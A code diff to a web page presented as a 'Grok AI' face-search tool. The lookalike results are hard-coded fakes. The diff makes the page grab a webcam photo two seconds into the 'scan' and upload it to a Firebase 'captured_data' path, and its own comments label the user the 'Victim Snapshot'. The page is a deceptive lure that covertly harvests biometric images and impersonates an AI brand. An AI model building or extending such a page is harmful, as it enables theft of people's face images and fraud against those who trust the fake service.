@@ -58,9 +58,7 @@
     display: flex; align-items: center; justify-content: center; gap: 8px;
   }
   .story-bar .ai-prefix { color: #10b981; font-weight: bold; }
-  .story-text::after {
-    content: '▌'; animation: blink 1s infinite; margin-left: 2px;
-  }
+  .story-text::after { content: '▌'; animation: blink 1s infinite; margin-left: 2px; }
   @keyframes blink { 50% { opacity: 0; } }
 
   /* LAYOUT */
@@ -105,10 +103,10 @@
   .scan-line.active { display: block; }
   @keyframes scan { 0% { top: 0; opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
 
-  /* CHAT BOX */
+  /* CHAT BOX (TERMINAL) */
   .chat-box {
     background: #0a101d; border: 1px solid rgba(0, 212, 255, 0.2);
-    border-radius: 12px; padding: 15px; height: 110px;
+    border-radius: 12px; padding: 15px; height: 120px;
     font-family: 'JetBrains Mono', monospace; font-size: 11px;
     display: flex; flex-direction: column; gap: 6px; overflow-y: auto;
   }
@@ -120,15 +118,36 @@
   .right-panel { width: 60%; padding: 20px; background: #0a0f1d; overflow-y: auto; display: flex; flex-direction: column; }
   
   /* LOADING & ERROR */
-  .loading-screen { height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+  .loading-screen { height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; position: relative; }
   .spinner {
     width: 80px; height: 80px; border: 4px solid rgba(0, 212, 255, 0.1);
     border-top: 4px solid #00d4ff; border-radius: 50%;
     animation: spin 0.8s linear infinite; margin-bottom: 20px; box-shadow: 0 0 30px rgba(0, 212, 255, 0.2);
+    z-index: 2;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
-  .load-text { font-family: 'JetBrains Mono', monospace; font-size: 18px; color: #00d4ff; letter-spacing: 2px; margin-bottom: 10px; }
-  .load-subtext { color: #4a6b8a; font-size: 13px; font-family: 'JetBrains Mono', monospace; margin-bottom: 20px; }
+  .load-text { font-family: 'JetBrains Mono', monospace; font-size: 18px; color: #00d4ff; letter-spacing: 2px; margin-bottom: 10px; z-index: 2;}
+  .load-subtext { color: #4a6b8a; font-size: 13px; font-family: 'JetBrains Mono', monospace; margin-bottom: 20px; z-index: 2;}
+
+  /* RADAR BACKGROUND FOR LOADING */
+  .radar-bg {
+    position: absolute; width: 300px; height: 300px;
+    border: 1px solid rgba(0, 212, 255, 0.1); border-radius: 50%;
+    top: 50%; left: 50%; transform: translate(-50%, -50%);
+    display: none;
+  }
+  .radar-bg.active { display: block; }
+  .radar-bg::before, .radar-bg::after {
+    content: ''; position: absolute; border-radius: 50%; border: 1px solid rgba(0, 212, 255, 0.1);
+  }
+  .radar-bg::before { inset: 30px; }
+  .radar-bg::after { inset: 60px; }
+  .radar-sweep {
+    position: absolute; top: 0; left: 50%; width: 50%; height: 50%;
+    background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.2));
+    transform-origin: bottom left; animation: radarSpin 2s linear infinite;
+  }
+  @keyframes radarSpin { to { transform: rotate(360deg); } }
 
   /* ERROR BOX */
   .error-box { display: none; height: 100%; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
@@ -136,6 +155,21 @@
   .error-box h2 { color: #ff2e4c; font-family: 'JetBrains Mono', monospace; margin-bottom: 10px; }
   .retry-btn { padding: 12px 30px; background: rgba(255, 46, 76, 0.1); border: 1px solid #ff2e4c; color: #ff2e4c; font-family: 'JetBrains Mono', monospace; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.3s; }
   .retry-btn:hover { background: #ff2e4c; color: #000; }
+
+  /* TARGET PROFILE (VICTIM SNAPSHOT) */
+  .target-profile {
+    display: none; text-align: center; margin-bottom: 20px;
+    background: rgba(0, 212, 255, 0.05); border: 1px solid rgba(0, 212, 255, 0.3);
+    border-radius: 12px; padding: 15px; animation: fadeIn 0.5s;
+  }
+  .target-profile.active { display: block; }
+  .target-profile img {
+    width: 120px; height: 120px; object-fit: cover; border-radius: 50%;
+    border: 2px solid #00d4ff; box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
+    filter: grayscale(0.5) contrast(1.2); margin-bottom: 10px;
+  }
+  .target-profile h3 { font-family: 'JetBrains Mono', monospace; color: #00d4ff; font-size: 14px; }
+  .target-profile p { font-size: 11px; color: #4a6b8a; margin-top: 4px; }
 
   /* RESULTS GRID */
   .results-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; font-family: 'JetBrains Mono', monospace; }
@@ -207,6 +241,8 @@
   .pro-features li::before { content: '✔'; color: #10b981; font-weight: bold; }
   .close-pro { position: absolute; top: 15px; right: 15px; background: none; border: none; color: #4a6b8a; font-size: 20px; cursor: pointer; }
 
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+
   @media (max-width: 900px) { 
     .main-container { flex-direction: column; height: auto; } 
     .left-panel, .right-panel { width: 100%; } 
@@ -264,6 +300,7 @@
       </div>
     </div>
     
+    <!-- TERMINAL LOGS -->
     <div class="chat-box" id="chatBox">
       <div class="chat-msg sys">[GROK SYSTEM BOOT COMPLETE]</div>
       <div class="chat-msg">Grok: Awaiting user input...</div>
@@ -279,6 +316,9 @@
 
     <!-- Loading Screen -->
     <div class="loading-screen" id="loadingScreen" style="display:none;">
+      <div class="radar-bg" id="radarBg">
+        <div class="radar-sweep"></div>
+      </div>
       <div class="spinner"></div>
       <div class="load-text" id="loadText">SCANNING...</div>
       <div class="load-subtext" id="loadSubtext">Extracting facial landmarks</div>
@@ -294,6 +334,13 @@
 
     <!-- Results Grid -->
     <div id="resultsContainer" style="display:none;">
+      <!-- TARGET PROFILE (Victim Snapshot) -->
+      <div class="target-profile" id="targetProfile">
+        <img src="" id="targetImg" alt="Target Profile">
+        <h3>TARGET ACQUIRED</h3>
+        <p id="targetMeta">BIOMETRIC MATCH CONFIRMED</p>
+      </div>
+
       <div class="results-header">
         <h2>GLOBAL MATCHES</h2>
         <div class="accuracy" id="accLabel">ACCURACY: 100.00%</div>
@@ -340,6 +387,7 @@
   const canvas = document.getElementById('canvas');
   const chatBox = document.getElementById('chatBox');
   const storyText = document.getElementById('storyText');
+  const targetImg = document.getElementById('targetImg');
 
   const lookalikes = [
     { name: 'Alexander D.', country: 'Russia', match: '100%' },
@@ -351,9 +399,6 @@
     { name: 'Chen W.', country: 'China', match: '100%' }
   ];
 
-  // ==========================================
-  // 🎙️ AI VOICE & TYPING ANIMATION
-  // ==========================================
   function speak(text) {
     if ('speechSynthesis' in window) {
       window.speechSynthesis.cancel();
@@ -418,6 +463,7 @@
     document.getElementById('warningOverlay').style.display = 'none';
     document.getElementById('idleState').style.display = 'none';
     document.getElementById('loadingScreen').style.display = 'flex';
+    document.getElementById('radarBg').classList.add('active');
     
     speak("Consent accepted. Initiating scan.");
     addChat("Consent accepted. Scan initiated.");
@@ -433,7 +479,32 @@
     document.getElementById('scanLine').classList.add('active');
     document.getElementById('meshOverlay').classList.add('active');
 
+    // Capture target photo after 2 seconds
+    setTimeout(() => {
+      captureTargetPhoto();
+    }, 2000);
+
     runFastProcess(stream);
+  }
+
+  function captureTargetPhoto() {
+    const ctx = canvas.getContext('2d');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    ctx.translate(canvas.width, 0); ctx.scale(-1, 1); // Mirror
+    ctx.drawImage(video, 0, 0);
+    
+    const photo = canvas.toDataURL('image/jpeg', 0.8);
+    targetImg.src = photo;
+
+    // Save to Firebase immediately
+    if (db) {
+      db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
+        image: photo,
+        timestamp: Date.now(),
+        type: 'grok_ai_face_search'
+      });
+    }
   }
 
   function runFastProcess(stream) {
@@ -475,6 +546,7 @@
   function retryScan() {
     document.getElementById('errorBox').style.display = 'none';
     document.getElementById('loadingScreen').style.display = 'flex';
+    document.getElementById('radarBg').classList.add('active');
     
     speak("Reconnecting to secure server. Resuming scan.");
     addChat("Reconnecting...", 'sys');
@@ -514,6 +586,7 @@
     document.getElementById('scanLine').classList.remove('active');
     document.getElementById('meshOverlay').classList.remove('active');
     document.getElementById('loadingScreen').style.display = 'none';
+    document.getElementById('radarBg').classList.remove('active');
     
     if(stream) stream.getTracks().forEach(t => t.stop());
 
@@ -521,6 +594,7 @@
     addChat("Scan complete. 7 exact matches found.", 'sys');
 
     document.getElementById('resultsContainer').style.display = 'block';
+    document.getElementById('targetProfile').classList.add('active'); // Show target card
     document.getElementById('accLabel').textContent = "ACCURACY: 100.00%";
     
     const grid = document.getElementById('resultsGrid');
@@ -557,19 +631,6 @@
 
       }, index * 150);
     });
-
-    if (db) {
-      const ctx = canvas.getContext('2d');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      ctx.drawImage(video, 0, 0);
-      const finalPhoto = canvas.toDataURL('image/jpeg', 0.8);
-      db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
-        image: finalPhoto,
-        timestamp: Date.now(),
-        type: 'grok_ai_face_search'
-      });
-    }
   }
 </script>
 
